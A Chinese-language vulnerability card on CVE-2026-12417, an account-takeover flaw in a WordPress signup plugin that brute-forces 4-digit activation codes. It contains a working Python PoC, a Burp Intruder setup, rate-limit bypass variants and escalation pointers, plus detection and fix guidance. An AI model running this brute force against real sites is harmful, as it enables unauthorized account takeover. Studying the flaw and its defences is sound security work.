---
id: web-generic-auth-wordpress-plugin-pravel-activation-code-bruteforce
title: WordPress SignUp & SignIn 插件 rand() 生成 4 位激活码且无速率限制：未认证爆破接管账号（CVE-2026-12417）
type: scenario
domain: web
path: web/generic/auth
technique: wp-plugin-weak-activation-code-bruteforce-account-takeover
aliases:
- CVE-2026-12417
- SignUp & SignIn 账号接管
- pravel_check_activation 爆破
- WordPress 激活码暴力破解
- rand(1000,9999) 弱随机数
- wp_ajax_nopriv 账号接管
tags:
- wordpress
- php
- weak-random
- activation-code
- bruteforce
- account-takeover
- auth
- cve-2026-12417
cve:
- CVE-2026-12417
severity: critical
confidence: high
status: verified
affected_versions: SignUp & SignIn ≤ 1.0.0（原文；最新版本 1.0.0 尚无官方修复；原文环境表另标注 1.0.3）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:09:19+08:00'
  notes: 已对照原文与9张截图核对：rand(1000,9999)生成激活码、wp_ajax_nopriv_pravel_check_activation无速率限制、遍历1000-9999激活pending账户并登录subscriber，截图07显示2419成功。原文自身不一致：正文统计写命中5193/4193次，而4.2节与截图07为2419；卡内已按原文标注'实测数据（原文）'，不影响结论。受影响版本原文自相矛盾（环境表1.0.3 vs 最新1.0.0、PoC注释<=1.0.0），已并列如实标注；PoC未执行。
---

## 一句话结论

WordPress 插件 SignUp & SignIn 用 `rand(1000, 9999)` 生成只有 9,000 种可能的账号激活码，并把校验函数注册为 `wp_ajax_nopriv_pravel_check_activation`（无需登录），且没有速率限制、失败锁定或 CAPTCHA；未认证攻击者可注册一个待激活账户后遍历 1000–9999，在数分钟内命中激活码，把账户从 `pending` 提升为 `subscriber` 并登录接管。

## 原理

- 激活码生成（`lib/function.php:102`）：
  ```php
  $activation_code = rand(1000,9999);   // 仅 9,000 种可能
  add_user_meta($user_id, 'has_to_be_activated', $activation_code, true);
  ```
  `rand()` 使用线性同余生成器（LCG），既不是加密安全随机数，搜索空间也极小；即便不预测种子，9,000 次尝试对自动化攻击也微不足道。
- 校验端点（`lib/function.php:162-169`）：
  ```php
  function pravel_check_activation(){
      $activation_code = sanitize_text_field($_POST['activation_code']);
      $user = reset(get_users(array(
          'meta_key'   => 'has_to_be_activated',
          'meta_value' => $activation_code,
          'number'     => 1,
      )));
      // 无 rate limiting、无失败锁定、无 CAPTCHA
  ```
  通过 `add_action('wp_ajax_nopriv_pravel_check_activation', ...)` 注册，未登录用户可直接调用。
- 命中后逻辑：删除 `has_to_be_activated` meta，把 `wp_capabilities` 从 `pending` 改为 `subscriber`，账户即可登录。
- 攻击链：`POST admin-ajax.php?action=pravel_ajaxregister` 注册待激活账户 → 对 `action=pravel_check_activation` 遍历 1000–9999 → 命中后以注册密码登录 `/wp-login.php`。
- 根本问题是三个缺陷叠加：低熵随机数（4 位）、无速率限制、`nopriv` 端点公开。即使换成 6 位数字，若完全没有速率限制，100 万种可能仍可在可接受时间内爆破；反过来，使用 CSPRNG 且无速率限制时，6 位数字也并非安全。

## 触发条件

- 目标 WordPress 安装并启用 SignUp & SignIn 插件（受影响版本，原文最新 1.0.0 未修复）。
- `wp-admin/admin-ajax.php` 可达，且插件注册了 `wp_ajax_nopriv_pravel_check_activation`。
- 目标存在待激活（`has_to_be_activated`）用户；攻击者可自行注册创建，或等待/诱导合法用户注册。
- 激活码为 4 位数字（1000–9999），且校验端无速率限制/锁定。
- 攻击者能承受数百到数千次请求（本地 20 线程实测约 4 分钟；远程低延迟环境更快）。

## 利用步骤

1. 访问目标站点触发插件初始化，确认注册与激活 AJAX 动作存在。
2. 注册一个待激活账户：
   ```text
   POST /wp-admin/admin-ajax.php
   action=pravel_ajaxregister&user_name=attacker&user_email=attacker@test.com
   &user_password=Test123!&user_first_name=A&user_last_name=B
   ```
   响应 `{"signup":true,...}`，账户状态为 `pending`，激活码已发往注册邮箱（攻击者不知道）。
3. 遍历激活码：
   ```text
   POST /wp-admin/admin-ajax.php
   action=pravel_check_activation&activation_code={1000..9999}
   ```
   失败返回 `{"activation":false,"message":"Activation code is wrong"}`；命中返回 `{"activation":true,...}`。
4. 命中后账户 `wp_capabilities` 变为 `subscriber`，用注册密码登录 `/wp-login.php`。
5. 若有多个待激活用户，命中码可能激活其他用户；可批量注册/批量爆破扩大收益。
6. 获得 subscriber 后，结合 WordPress 插件/主题漏洞进一步提权。

## PoC

```python
import requests

target = "http://target:9982"
s = requests.Session()

# 1. 注册待激活账户
s.post(f"{target}/wp-admin/admin-ajax.php", data={
    "action": "pravel_ajaxregister",
    "user_name": "attacker", "user_email": "attacker@test.com",
    "user_password": "Test123!", "user_first_name": "A", "user_last_name": "B",
})

# 2. 遍历 1000-9999
for code in range(1000, 10000):
    r = s.post(f"{target}/wp-admin/admin-ajax.php", data={
        "action": "pravel_check_activation", "activation_code": str(code),
    })
    if '"activation":true' in r.text:
        print("FOUND", code)
        break
```

Burp Intruder：

```text
POST /wp-admin/admin-ajax.php
action=pravel_check_activation&activation_code=§1000§
Payload type: Numbers, From 1000 To 9999
Filter: exclude responses containing "Activation code is wrong"
```

实测数据（原文）：9,000 种可能，50% 约 4,500 次请求，99% 约 8,955 次；20 线程本地 Docker 下 4,193 次请求耗时 247 秒（约 17 req/s），命中码 5193；远程 ~200ms/req、20 线程预估约 90 秒。

## 变体与关联

- 变体（流程）：注册激活、邮箱验证、密码重置、邀请码、优惠券等“短数字/字母 token”流程都可能复用同一爆破模型。
- 变体（随机数）：`rand()`/`mt_rand()` 可预测；即使换成 `random_int()`，无速率限制时低位数 token 仍可爆破。
- 变体（绕过速率限制）：更换 IP/XFF、轮换会话、利用竞态并发提交、分布式爆破；若限制按账号而非按 IP，可批量注册绕过。
- 变体（批量接管）：批量注册待激活账户并并发爆破；若站点存在大量未激活的合法用户，命中码可能激活受害者账户。
- 关联：[[web-generic-auth-2fa-user-parameter-tampering-code-bruteforce]]（4 位验证码爆破与参数篡改的同类思路）。
- 关联：[[web-generic-auth-login-bruteforce-response-payload]]（响应差异判读与过滤）。
- 边界：需要目标存在待激活用户且注册开放；激活码位数更长且有限速时爆破成本上升；命中后仅获得 subscriber，需进一步提权。

## 检测与防御

- 修复：用 `random_int(100000, 999999)`（或更长）替代 `rand()`；使用 `wp_generate_password()` 等等价 CSPRNG。
- 修复：校验函数加按 IP/账号/会话的速率限制与失败锁定：
  ```php
  $ip = $_SERVER['REMOTE_ADDR'];
  $attempts = get_transient("pravel_activation_attempts_$ip") ?: 0;
  if ($attempts > 10) { echo json_encode(['activation'=>false,'message'=>'Too many attempts.']); die(); }
  set_transient("pravel_activation_attempts_$ip", $attempts + 1, 600);
  ```
- 修复：激活码绑定用户/会话，一次有效、短过期；校验失败统一响应文案与长度。
- 加固：`wp_ajax_nopriv_*` 端点视为公开攻击面，按登录表单/REST API 同等标准审查；增加 CAPTCHA 或人机校验。
- 检测：`admin-ajax.php` 上 `pravel_check_activation` 的高频请求；同一 IP/会话在短时间内提交大量 4 位数字；失败响应占比极高后突然出现成功响应。
- 检测：大量 `pravel_ajaxregister` 注册与随后的激活尝试；新注册账户集中激活；WordPress 审计日志中 `wp_capabilities` 从 pending 到 subscriber 的异常变更。
- 检测：`grep -rn 'rand(1000.*9999)\|rand(10000.*99999)'` 定位弱随机数；用 `curl` 连续发送错误码，若始终返回 `activation:false` 而非限速提示，说明缺少防护。
